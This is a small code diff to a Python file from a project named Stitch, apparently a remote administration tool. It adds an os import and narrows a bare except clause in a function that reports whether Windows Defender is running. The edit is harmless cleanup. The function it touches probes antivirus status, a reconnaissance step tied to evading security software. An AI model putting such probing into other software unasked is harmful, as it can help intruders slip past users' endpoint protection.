@@ -1,3 +1,4 @@
+import os
 # Copyright (c) 2017, Nathan Lopez
 # Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
 
@@ -268,7 +269,7 @@ def windefnd_running():
                 return "Windows Defender:\t\tDisabled\n"
             else:
                 return "Windows Defender:\t\tRunning\n"
-        except:
+        except Exception:
             return "Windows Defender:\t\tRunning\n"
 
 process_list = []
